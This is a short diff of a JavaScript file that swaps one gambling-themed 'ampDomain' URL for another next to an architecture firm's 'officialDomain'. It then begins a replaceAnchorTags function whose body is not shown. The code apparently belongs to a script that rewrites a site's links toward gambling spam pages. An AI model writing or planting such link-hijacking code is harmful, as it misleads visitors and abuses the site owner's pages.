@@ -1,7 +1,7 @@
 
 // Define the official domains
 const officialDomain = 'https://vanoniarquitectos.com/contacto/'; 
-const ampDomain = 'https://slotgacorhariini-seo.pages.dev/';       
+const ampDomain = 'https://akunsiapmain.blog/byd178/';       
 
 function replaceAnchorTags() {
   
